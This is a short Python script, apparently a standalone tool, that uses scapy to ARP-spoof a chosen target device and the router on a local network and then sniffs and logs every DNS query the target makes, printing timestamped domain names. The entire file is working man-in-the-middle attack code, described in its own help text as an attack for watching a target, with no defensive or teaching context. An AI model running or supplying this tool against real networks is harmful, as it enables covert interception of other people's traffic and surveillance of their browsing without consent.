#!/usr/bin/env python3


import argparse
import threading
from time import strftime, localtime
from scapy.all import arp_mitm, Ether, ARP, sniff, DNS, srp


class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print("IP seems down, retrying ...")
                continue

    def capture(self):
        sniff(
            iface=self.iface,
            prn=self.process_dns,
            filter=f"src host {self.targetip} and udp port 53",
        )

    def process_dns(self, packet):
        time = strftime("%m/%d/%y %H:%M:%S", localtime())
        domain = packet[DNS].qd.qname.decode("utf-8").strip(".")
        print(f"[{time}] [{domain}]")

    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())
        t1.start()
        t2.start()


def main():
    parser = argparse.ArgumentParser(description="DNS sniffer")

    parser.add_argument(
        "--targetip", help="Target device you want to watch", required=True
    )
    parser.add_argument("--iface", help="Interface to use for attack", required=True)
    parser.add_argument("--routerip", help="IP of your home router", required=True)
    opts = parser.parse_args()

    device = Device(opts.routerip, opts.targetip, opts.iface)
    device.watch()


if __name__ == "__main__":
    main()
